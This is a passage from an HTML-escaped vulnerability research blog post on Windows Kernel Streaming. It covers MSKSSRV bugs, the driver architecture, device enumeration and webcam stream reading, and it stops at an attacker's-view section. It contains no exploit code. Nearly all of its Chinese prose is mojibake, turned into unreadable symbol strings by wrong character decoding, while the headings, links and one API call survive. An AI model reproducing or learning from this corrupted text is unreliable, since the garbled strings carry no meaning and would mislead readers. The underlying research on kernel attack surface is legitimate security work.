href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_file_object&quot;&gt;FILE_OBJECT&lt;/a&gt; ÁöÑ FsContext2 ‰∏≠ÔºåÁÑ∂ËÄåÂæåÁ∫å‰ΩøÁî®ÊôÇ‰∏¶Ê≤íÊúâÂ∞ç FsContext2 ÁöÑ&lt;strong&gt;ÂûãÊÖã&lt;/strong&gt;ÂÅöÊ™¢Êü•ÔºåÂ∞éËá¥ type confusionÔºåË©≥Á¥∞ÂÖßÂÆπÂèØÂèÉËÄÉ &lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;IBM X-Force ÁöÑÈÉ®ËêΩÊ†º&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëá≥Ê≠§‰πãÂæåÔºåÂ∞±ÂæàÂ∞ëÊúâÈóúÊñº MSKSSRV ÁöÑÁõ∏ÈóúÊºèÊ¥û‰∫Ü„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;but-is-that-the-end-of-it-&quot;&gt;But is that the end of it ?&lt;/h3&gt;
&lt;p&gt;ÁÑ∂ËÄåÊòØÂê¶ÈÄôÊ®£Â∞±Ê≤íÊ¥û‰∫ÜÂë¢Ôºü&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ËÄåÊàëË¶ÅÊõ¥Ê∫ñÁ¢∫Âú∞ÂõûÁ≠îÔºåNo!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ÂØ¶Èöõ‰∏äÊï¥ÂÄã Kernel Streaming Â∞±ÂÉè‰∏ãÈù¢ÈÄôÂºµÂúñÈÄôÊ®£ :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;MSKSSRV Âè™ÊòØÂÜ∞Â±±‰∏ÄËßíËÄåÂ∑≤ÔºåÂØ¶Èöõ‰∏äÈÇÑÊúâ‰∏çÂ∞ëÊΩõÂú®ÁöÑÂÖÉ‰ª∂Ôºå‰∏äÂúñ‰∏≠ÊâÄÂØ´ÁöÑÈÉΩÊòØÂ±¨Êñº Kernel Streaming ÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇÂØ¶ÈöõÂæÄÈÄôÊñπÂêëÊåñÊéò‰πãÂæåÔºåÊúÄÁµÇ‰πüÂú®ÈÄôÂÄãÊîªÊìäÈù¢‰∏äÂèñÂæó‰∏çÂ∞ëÊºèÊ¥ûÔºåÂ∞±Â¶ÇÂêåÊµÅÊ∞¥Ëà¨ÁöÑÊµÅÂá∫ÊºèÊ¥û‰æÜ„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240823/cover.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;È†ÜÂ∏∂‰∏ÄÊèêÔºåÊàëÂú®ÂØ´ÈÄôÁØáÈÉ®ËêΩÊ†ºÊôÇÔºåchompie ‰πüÁôºË°®‰∫ÜÊúâÈóúÊñº‰ªñÂú®‰ªäÂπ¥ Pwn2Own Vancouver 2024 ‰∏≠ÊâÄ‰ΩøÁî®ÁöÑÊºèÊ¥û &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30089&quot;&gt;CVE-2024-30089&lt;/a&gt;„ÄÇÈÄôÂÄãÊºèÊ¥û‰πüÂú® MSKSSRV ‰∏≠ÔºåË©≤ÊºèÊ¥ûÁôºÁîüÂú® Reference Count ÁöÑËôïÁêÜÔºåÂÖ∂ÊàêÂõ†‰πüÂæàÊúâË∂£Ôºå‰∏çÈÅéÈÄôÈÇäÂ∞±‰∏çÂ§öË´áÔºåË©≥Á¥∞ÂÖßÂÆπÂèØÂèÉËÄÉÂ•π&lt;a href=&quot;https://securityintelligence.com/x-force/little-bug-that-could/&quot;&gt;ÁôºË°®ÁöÑÊñáÁ´†&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;brief-overview-of-kernel-streaming&quot;&gt;Brief overview of Kernel Streaming&lt;/h2&gt;
&lt;p&gt;ÈÇ£È∫ºÔºå‰ªÄÈ∫ºÊòØ Kernel Streaming Âë¢Ôºü ‰∫ãÂØ¶‰∏äÔºåÊàëÂÄëÊ≠£Â∏∏‰ΩøÁî®ÈõªËÖ¶ÊÉÖÊ≥Å‰∏ãÂ∞±ÊúÉÁî®Âà∞ :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® Windows Á≥ªÁµ±‰∏äÔºåÁï∂ÊàëÂÄëÊâìÈñãÈè°È†≠„ÄÅÈñãÂïüÈü≥Êïà‰ª•ÂèäÈ∫•ÂÖãÈ¢®Á≠âÈü≥Ë®äË®≠ÂÇôÊôÇÔºåÁ≥ªÁµ±ÈúÄË¶ÅÂæûÈÄô‰∫õË®≠ÂÇôËÆÄÂèñ‰Ω†ÁöÑËÅ≤Èü≥„ÄÅÂΩ±ÂÉèÁ≠âÁõ∏ÈóúË≥áÊñôÂà∞ RAM ‰∏≠„ÄÇÁÇ∫‰∫ÜÊõ¥È´òÊïàÂú∞ÂÆåÊàêÈÄô‰∫õË≥áÊñôÁöÑÂÇ≥Ëº∏ÔºåÂæÆËªüÊèê‰æõ‰∫Ü‰∏ÄÂÄãÂêçÁÇ∫ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/kernel-streaming&quot;&gt;Kernel Streaming&lt;/a&gt; ÁöÑÊ°ÜÊû∂ÔºåÁî®‰æÜËôïÁêÜÈÄô‰∫õË≥áÊñô„ÄÇ&lt;strong&gt;ÈÄôÂÄãÊ°ÜÊû∂‰∏ªË¶ÅÂú® Kernel mode ‰∏ãÈÅãË°å&lt;/strong&gt;ÔºåÂÖ∑Êúâ‰ΩéÂª∂ÈÅ≤„ÄÅËâØÂ•ΩÁöÑÊì¥ÂÖÖÊÄßÂíåÁµ±‰∏Ä‰ªãÈù¢Á≠âÁâπÊÄßÔºå‰Ωø‰Ω†ËÉΩÊõ¥Êñπ‰æø„ÄÅÊõ¥È´òÊïàÂú∞ËôïÁêÜ‰∏≤ÊµÅÔºàStreamÔºâË≥áÊñô„ÄÇ&lt;/p&gt;

&lt;p&gt;Kernel Streaming ‰∏≠ÔºåÊèê‰æõ‰∫Ü‰∏âÁ®ÆÂ§öÂ™íÈ´îÈ©ÖÂãïÊ®°ÂûãÔºöport class„ÄÅAVStream Âíå stream class„ÄÇÈÄôË£°Â∞á‰∏ªË¶Å‰ªãÁ¥π port class Âíå AVStreamÔºåËÄå stream class Âõ†ÁÇ∫ËºÉÁÇ∫ÁΩïË¶ã‰∏îÈÅéÊôÇÔºå‰∏çÊúÉÂ§öÂä†Ë®éË´ñ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;port-class&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/introduction-to-port-class&quot;&gt;Port Class&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Â§ßÂ§öÊï∏Áî®Êñº PCI Âíå DMA ÂûãÈü≥ÊïàË£ùÁΩÆÁöÑÁ°¨È´îÈ©ÖÂãïÁ®ãÂºèÔºåÂÆÉËôïÁêÜËàáÈü≥Ë®äÁõ∏ÈóúÁöÑÊï∏ÊìöÂÇ≥Ëº∏Ôºå‰æãÂ¶ÇÈü≥ÈáèÊéßÂà∂„ÄÅÈ∫•ÂÖãÈ¢®Ëº∏ÂÖ•Á≠âÁ≠âÔºå‰∏ªË¶ÅÊúÉ‰ΩøÁî®Âà∞ÁöÑÂÖÉ‰ª∂ÂáΩÂºèÂ∫´ÊúÉÊòØ portcls.sys„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;avstream&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/avstream-overview&quot;&gt;AVStream&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;AVStream ÂâáÊòØÁî±ÂæÆËªüÊèê‰æõÁöÑÂ§öÂ™íÈ´îÈ°ûÈ©ÖÂãïÁ®ãÂºèÔºå‰∏ªË¶ÅÊîØÊè¥ÂÉÖÈôêÂΩ±ÁâáÁöÑ‰∏≤ÊµÅÂíåÊï¥ÂêàÈü≥Ë®ä/ÂΩ±Áâá‰∏≤ÊµÅÔºåÁõÆÂâçË∑üÂΩ±ÂÉèÊúâÈóúÁöÑËôïÁêÜÂ§öÊï∏ÈÉΩË∑üÈÄôÈ°ûÂà•ÊúâÈóúÔºå‰æãÂ¶Ç‰Ω†ÁöÑË¶ñË®äÈè°È†≠„ÄÅÊì∑ÂèñÂç°Á≠âÁ≠â„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂØ¶Èöõ‰∏ä Kernel Streaming ÁöÑ‰ΩøÁî®ÂæàË§áÈõúÔºåÂõ†Ê≠§ÈÄôË£°Âè™ÊúÉÁ∞°ÂñÆÁöÑÊïòËø∞‰∏Ä‰∏ãÔºåÊõ¥Â§öË©≥Á¥∞ÂÖßÂÆπÂèØ‰ª•ÂèÉËÄÉ&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/&quot;&gt;ÂæÆËªüÂÆòÊñπÊñá‰ª∂&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;interact-with-device&quot;&gt;Interact with device&lt;/h2&gt;
&lt;p&gt;Âú®ÊàëÂÄëÊÉ≥Ë¶ÅËàáÈü≥Ë®äË®≠ÂÇôÊàñÊòØË¶ñË®äÈè°È†≠Á≠âË®≠ÂÇô‰∫íÂãïÊôÇË©≤ÊÄéÈ∫ºÂÅöÂë¢ÔºüÂÖ∂ÂØ¶Â∞±Ë∑ü‰∏ÄËà¨Ë®≠ÂÇô‰∫íÂãï‰∏ÄÊ®£ÔºåÂèØ‰ª•ÈÄèÈÅé CreateFile ÂáΩÊï∏‰æÜÈñãÂïü‰∏ÄÂÄãË®≠ÂÇô„ÄÇÈÇ£È∫ºÈÄôÈ°ûÂûãÁöÑË®≠ÂÇôÔºåÂêçÁ®±ÂèàÊúÉÊòØÁîöÈ∫ºÂë¢ÔºüÂÖ∂ÂØ¶ÈÄôÈÇä‰∏çÂ§™ÊúÉÂÉèÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\Devcie\NamedPipe&lt;/code&gt; ÈÄôÈ°ûÂûãÁöÑÂêçÁ®±ÔºåËÄåÊòØÊúÉÂÉè‰∏ãÈù¢ÈÄôÊ®£ÁöÑË∑ØÂæë :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\?\hdaudio#subfunc_01&amp;amp;ven_8086&amp;amp;dev_2812&amp;amp;nid_0001&amp;amp;subsys_00000000&amp;amp;rev_1000#6&amp;amp;2f1f346a&amp;amp;0&amp;amp;0002&amp;amp;0000001d#{6994ad04-93ef-11d0-a3cc-00a0c9223196}\ehdmiouttopo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumerate-device&quot;&gt;Enumerate device&lt;/h3&gt;
&lt;p&gt;ÊØèÂè∞ÈõªËÖ¶ÈÉΩÂèØËÉΩ‰∏ç‰∏ÄÊ®£ÔºåÂøÖÈ†à‰ΩøÁî® &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows/win32/api/setupapi/nf-setupapi-setupdigetclassdevsw&quot;&gt;SetupDiGetClassDevs&lt;/a&gt; Á≠â API ÂéªÂàóËàâË®≠ÂÇôÔºå‰∏ÄËà¨‰æÜË™™ KS Á≥ªÂàóÁöÑË®≠ÂÇôÈÉΩÊúÉË®ªÂÜäÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSCATEGORY*&lt;/code&gt; Â∫ï‰∏ãÔºåÂÉèÊòØÈü≥Ë®äË®≠ÂÇôÂ∞±ÊúÉË®ªÂÜäÂú® &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/install/kscategory-audio&quot;&gt;KSCATEGORY_AUDIO&lt;/a&gt; ‰∏≠„ÄÇ&lt;/p&gt;

&lt;p&gt;‰Ω†‰πüÂèØ‰ª•‰ΩøÁî® KS ÊâÄÊèê‰æõÁöÑ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ksproxy/nf-ksproxy-ksopendefaultdevice&quot;&gt;KsOpenDefaultDevice&lt;/a&gt; Áç≤ÂæóË©≤È°ûÂà•‰∏≠Á¨¨‰∏ÄÂÄãÁ¨¶ÂêàÁöÑ PnP Ë£ùÁΩÆÁöÑ HandleÔºåÂØ¶Èöõ‰∏ä‰æÜË™™‰πüÂè™ÊòØ SetupDiGetClassDevs Âíå CreateFile ÁöÑÂ∞ÅË£ùËÄåÂ∑≤„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KsOpenDefaultDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSCATEGORY_VIDEO_CAMERA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_READ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g_hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;kernel-streaming-object&quot;&gt;Kernel Streaming object&lt;/h3&gt;
&lt;p&gt;ÊàëÂÄëÂú®ÈñãÂïüÈÄô‰∫õË®≠ÂÇô‰πãÂæåÔºåKernel Streaming ÊúÉÂú® Kernel ‰∏≠Âª∫Á´ã‰∏Ä‰∫õÁõ∏ÈóúÁöÑ InstanceÔºåÂÖ∂‰∏≠ÊúÄÁÇ∫ÈáçË¶ÅÁöÑÂ∞±ÊòØ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-filters&quot;&gt;KS Filters&lt;/a&gt; Âèä &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-pins&quot;&gt;KS Pins&lt;/a&gt;„ÄÇÂú® Kernel Streaming ÁöÑ‰ΩøÁî®ÈÅéÁ®ã‰∏≠ÔºåÈÄô‰∫õ Instance ÊúÉË¢´È†ªÁπÅ‰ΩøÁî®ÔºåÂÆÉÂÄë‰∏ªË¶ÅÁî®‰æÜÂ∞ÅË£ùË®≠ÂÇôÁöÑÁ°¨È´îÂäüËÉΩÔºåÊñπ‰æøÈñãÁôºËÄÖÈÄèÈÅéÁµ±‰∏ÄÁöÑ‰ªãÈù¢ÈÄ≤Ë°å‰∏≤ÊµÅÁöÑËôïÁêÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÈÇäÂÖà‰ª• &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters&quot;&gt;Audio Filters&lt;/a&gt; ‰ΩúÁÇ∫‰æãÂ≠êÔºåÂÖ∂‰ªñÂ§öÊï∏Â§ßÂêåÂ∞èÁï∞ÔºåÊàëÂÄë‰πüÂè™ÊúÉÁ∞°ÂñÆ‰ªãÁ¥πÔºåÂÖ∂‰ªñÁ¥∞ÁØÄË´ãËá™Ë°åÂèÉËÄÉÂæÆËªüÂÆòÊñπÊñá‰ª∂„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;ks-filters&quot;&gt;KS filters&lt;/h4&gt;
&lt;p&gt;ÊØèÂÄã KS Filter ÈÄöÂ∏∏‰ª£Ë°®‰∏ÄÂÄãË®≠ÂÇôÊàñË®≠ÂÇôÁöÑÁâπÂÆöÂäüËÉΩÔºåÂú®ÊàëÂÄëÊâìÈñã‰∏ÄÂÄãÈü≥Ë®äË®≠ÂÇôÂæåÔºåÂ§ßÈÉ®ÂàÜÊÉÖÊ≥Å‰∏ãÊúÉÂ∞çÊáâÂà∞‰∏ÄÂÄã Kernel FilterÔºåÁï∂ÊàëÂÄëÂæûÈü≥Ë®äË®≠ÂÇôËÆÄÂèñË≥áÊñôÊôÇÔºåÈÄô‰∫õË≥áÊñôÂ∞±ÊúÉÂÖàÈÄöÈÅéÈÄôÂÄã KS Filter ÈÄ≤Ë°åËôïÁêÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê¶ÇÂøµ‰∏äÂ¶Ç‰∏ãÂúñÊâÄÁ§∫Ôºå‰∏≠ÈñìÁöÑÂ§ßÊ°ÜË°®Á§∫‰∏ÄÂÄã‰ª£Ë°®Èü≥Ë®äË®≠ÂÇôÁöÑ KS filter„ÄÇËÄåÊàëÂÄëÊÉ≥Ë¶ÅÂæûÈü≥Ë®äË®≠ÂÇô‰∏≠ËÆÄÂèñË≥áÊñôÊôÇÔºåÊúÉÂæûÂ∑¶ÈÇäËÆÄÂÖ• FilterÔºåÁ∂ìÈÅéÂπæÂÄãÁØÄÈªûÈÄ≤Ë°åËôïÁêÜÂæåÔºåÂæûÂè≥ÈÇäËº∏Âá∫„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/7.png&quot; alt=&quot;&quot; /&gt;
 (From: https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters)&lt;/p&gt;

&lt;h4 id=&quot;ks-pins&quot;&gt;KS pins&lt;/h4&gt;
&lt;p&gt;‰∏äÂúñ‰∏≠ÔºåËÆÄÂèñÂèäËº∏Âá∫Ë≥áÊñôÁöÑÈªûÁ®±ÁÇ∫ PinÔºåKernel ‰πüÊúâÁõ∏Â∞çÊáâÁöÑ KS Pin ObjectÔºåÁî®ÊñºÊèèËø∞ÈÄô‰∫õ Pin ÁöÑË°åÁÇ∫Ôºå‰æãÂ¶Ç Pin ÊòØËº∏ÂÖ•Á´ØÈÇÑÊòØËº∏Âá∫Á´Ø„ÄÅÊîØÊè¥ÁöÑÊ†ºÂºèÊúâÂì™‰∫õÁ≠â„ÄÇÊàëÂÄë‰ΩøÁî®ÊôÇÂøÖÈ†àÂú® Filters ‰∏äÔºå&lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/nf-ks-kscreatepin&quot;&gt;ÈñãÂïü‰∏ÄÂÄã Pin&lt;/a&gt; ‰æÜÂª∫Á´ã InstanceÔºåÊâçËÉΩÂæûË®≠ÂÇôËÆÄÂèñÊàñËº∏Âá∫Ë≥áÊñô„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ks-property&quot;&gt;KS Property&lt;/h3&gt;
&lt;p&gt;ÈÄô‰∫õ KS Object ÈÉΩÊúÉÊúâËá™Â∑±ÁöÑ PropertyÔºåÊØèÂÄã Property ÈÉΩÊúÉÊúâÁõ∏Â∞çÊáâÁöÑÂäüËÉΩÔºåÂâçÈù¢ÊâÄÊèêÂà∞ÁöÑ Pin ‰∏≠ÁöÑË≥áÊñôÊ†ºÂºè„ÄÅÈü≥ÈáèÂ§ßÂ∞èÂèäË®≠ÂÇôÁöÑÁãÄÊÖãÁ≠âÁ≠âÔºåÈÄô‰∫õÈÉΩÊòØ‰∏ÄÂÄã PropertyÔºåÈÄöÂ∏∏ÊúÉÂ∞çÊáâÂà∞‰∏ÄÁµÑ GUIDÔºåÊàëÂÄëÂèØ‰ª•ÈÄèÈÅé &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_property&quot;&gt;IOCTL_KS_PROPERTY&lt;/a&gt; ‰æÜËÆÄÂèñÊàñË®≠ÂÆöÈÄô‰∫õ Property„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÂ§ßÂ§ßÁ∞°Âåñ‰∫ÜÂ§öÂ™íÈ´îÈ©ÖÂãïÁ®ãÂºèÁöÑÈñãÁôºÔºå‰∏¶‰∏îÁ¢∫‰øù‰∫Ü‰∏çÂêåË®≠ÂÇô‰πãÈñìÁöÑ‰∏ÄËá¥ÊÄßÂíåÂèØÊì¥Â±ïÊÄß„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;read-streams-from-webcam&quot;&gt;Read streams from webcam&lt;/h3&gt;
&lt;p&gt;ÈÄôÈÇäÂ∞±Áî®ÂÄãÁ∞°ÂñÆÁöÑÁØÑ‰æã‰æÜ‰ªãÁ¥π‰∏Ä‰∏ã Application Â¶Ç‰ΩïÂæûË¶ñË®äÈè°È†≠ËÆÄÂèñË≥áÊñô&lt;/p&gt;

&lt;p&gt;ÂÖ∂ÊúÄÁ∞°ÂñÆÁöÑÊµÅÁ®ãÂ§ßÊ¶ÇÂ¶ÇÈÄôÂºµÂúñÊâÄÁ§∫ :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ÈñãÂïüË®≠ÂÇôÂæåÁç≤ÂæóË®≠ÂÇô Handle&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî®ÈÄôÂÄã Handle Âú®ÈÄôÂÄã Filter ‰∏äÂª∫Á´ã Pin ÁöÑ Instance ‰∏¶Áç≤Âæó Pin handle&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî® IOCTL_KS_PROPERTY Ë®≠ÁΩÆ Pin ÁöÑÁãÄÊÖãÂà∞ RUN&lt;/li&gt;
  &lt;li&gt;ÊúÄÂæåÂ∞±ÂèØ‰ª•‰ΩøÁî® &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_read_stream&quot;&gt;IOCTL_KS_READ_STREAM&lt;/a&gt; ÂæûÈÄôÂÄã Pin ‰∏≠ËÆÄË≥áÊñôÈÄ≤‰æÜ&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;kernel-streaming-architecture&quot;&gt;Kernel Streaming architecture&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;Â∞çÊºèÊ¥ûÁ†îÁ©∂ËÄåË®ÄÔºåÊàëÂÄëÂøÖÈ†àÂÖà‰∫ÜËß£ÂÖ∂Êû∂ÊßãÔºåÊÄùËÄÉÊúâÂì™‰∫õÂèØËÉΩÁöÑÊîªÊìäÈù¢&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Âú®ÂàùÊ≠•‰∫ÜËß£ Kernel Streaming ÊúâÂì™‰∫õÂäüËÉΩÂíåÊìç‰ΩúÂæåÔºåÁÇ∫‰∫ÜÊâæÂ∞ãÊºèÊ¥ûÂøÖÈ†àÂÖà‰∫ÜËß£‰∏Ä‰∏ãÊû∂ÊßãÔºå‰∫ÜËß£ Windows ÊòØÊÄéÈ∫ºÂØ¶‰ΩúÈÄô‰∫õÂäüËÉΩ„ÄÅÂàÜÂà•ÊúâÂì™‰∫õÂÖÉ‰ª∂Á≠âÁ≠âÔºåÊâçÁü•ÈÅìÊáâË©≤Ë¶ÅÂàÜÊûêÂì™‰∫õ sysÔºåÂæûÂì™ÈÇä‰∏ãÊâãÊúÉÊØîËºÉÂ•Ω„ÄÇ&lt;/p&gt;

&lt;p&gt;Á∂ìÈÅéÊàëÂÄëÂàÜÊûêÂæåÔºåÊï¥ÂÄãÊû∂ÊßãÁ¥ÑÁï•ÊúÉÂÉèÈÄôÂºµÂúñÊâÄÁ§∫ :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® Kernel Stearming ÂÖÉ‰ª∂‰∏≠ÔºåÊúÄÁÇ∫Ê†∏ÂøÉÁöÑÂ∞±ÊòØ ksthunk.sys Âèä ks.sysÔºåÂπæ‰πéÊâÄÊúâÂäüËÉΩÈÉΩÊúÉËàáÂÆÉÂÄëÊúâÈóú„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ksthunk-kernel-streaming-wow-thunk-service-driver&quot;&gt;ksthunk (Kernel Streaming WOW Thunk Service Driver)&lt;/h3&gt;
&lt;p&gt;Application ÂëºÂè´ DeviceIoControl ÂæåÔºåÂú® Kernel Streaming ‰∏≠ÁöÑ&lt;strong&gt;ÂÖ•Âè£Èªû&lt;/strong&gt;Ôºå‰ΩÜÂÆÉÂäüËÉΩÂæàÁ∞°ÂñÆÔºåË≤†Ë≤¨Â∞á WoW64 process ‰∏≠ 32-bit ÁöÑ requests ËΩâÊèõÊàê 64-bit ÁöÑ requestsÔºå‰ΩøÂæó‰∏ãÂ±§ÁöÑ driver Â∞±ÂèØ‰ª•‰∏çÂøÖÁÇ∫ 32 ‰ΩçÂÖÉÁöÑÁµêÊßãÂè¶Â§ñËôïÁêÜ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ks-kernel-connection-and-streaming-architecture-library&quot;&gt;ks (Kernel Connection and Streaming Architecture Library)&lt;/h3&gt;
&lt;p&gt;Kernel Streaming ÁöÑ&lt;strong&gt;Ê†∏ÂøÉÂÖÉ‰ª∂&lt;/strong&gt;‰πã‰∏ÄÔºåÂÆÉÊòØ Kernel Streaming ÁöÑÂáΩÁ§∫Â∫´ÔºåË≤†Ë≤¨ÂèäËΩâÁôº IOCTL_KS_PROPERTY Á≠â requests Âà∞Â∞çÊáâË®≠ÂÇôÁöÑ driver ‰∏≠ÔºåÂêåÊôÇ‰πüÊúÉË≤†Ë≤¨ËôïÁêÜ AVStream ÁöÑÁõ∏ÈóúÂäüËÉΩ„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;the-work-flow-of-ioctl_ks_&quot;&gt;The work flow of IOCTL_KS_*&lt;/h3&gt;
&lt;p&gt;ËÄåÂú®ÂëºÂè´ DeviceIoControl ÊôÇÔºåÂ∞±ÊúÉÂÉè‰∏ãÂúñ‰∏ÄÊ®£ÔºåÂ∞á‰ΩøÁî®ËÄÖÁöÑ requests ‰æùÂ∫èÁµ¶Áõ∏Â∞çÊáâÁöÑ driver ‰æÜËôïÁêÜ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÂà∞Á¨¨ 6 Ê≠•ÊôÇ ks.sys Â∞±ÊúÉÊ†πÊìö‰Ω† requests ÁöÑ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure&quot;&gt;Property&lt;/a&gt; ‰æÜÊ±∫ÂÆöË¶Å‰∫§Áµ¶Âì™ÂÄã driver Âèä handler ‰æÜËôïÁêÜ‰Ω†ÁöÑ request„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊúÄÁµÇÂÜçËΩâÁôºÁµ¶Áõ∏Â∞çÊáâÁöÑ DriverÔºåÂ¶Ç‰∏äÂúñ‰∏≠ÊúÄÂæåËΩâÁôºÁµ¶ portcls ‰∏≠ÁöÑ handler ‰æÜÊìç‰ΩúÈü≥Ë®äË®≠ÂÇô„ÄÇ&lt;/p&gt;

&lt;p&gt;Âà∞ÈÄôÈÇäÊáâË©≤Â∞ç Kernel Streaming ÁöÑÊû∂ÊßãÂèäÊµÅÁ®ãÊúâÂàùÊ≠•Ê¶ÇÂøµ‰∫ÜÔºåÊé•‰∏ã‰æÜÂ∞±ÊòØÊâæÊ¥ûÁöÑÊôÇÂàª„ÄÇ‰æùÁÖßÁèæÊúâÁöÑÂÖÉÁ¥†‰æÜÁúãÔºåÂì™‰∫õÊòØÂÄºÂæó‰∏ÄÁúãÁöÑÊîªÊìäÈù¢Âë¢Ôºü&lt;/p&gt;

&lt;h3 id=&quot;from-attackers-view&quot;&gt;From attacker‚Äôs view&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;Âú®ÊåñÊéòÊºèÊ¥ûÂâçÔºåÂ¶ÇÊûúËÉΩ‰ªîÁ¥∞ÊÄùËÄÉÊÄéÊ®£ÁöÑÊÉÖÊ≥Å‰∏ãÂÆπÊòìÊúâÊ¥ûÔºåÂèØ‰ª•ÈÅîÂà∞‰∫ãÂçäÂäüÂÄçÁöÑÊïàÊûú&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Âæû‰∏ÄÂÄãÊºèÊ¥ûÁ†îÁ©∂Âì°ÁöÑËßíÂ∫¶‰æÜË™™ÔºåÂ§ßÊ¶ÇÊúÉÊúâ‰∏ãÂàóÈÄôÂπæÂÄãÈªû&lt;/p&gt;

&lt;ol&gt;
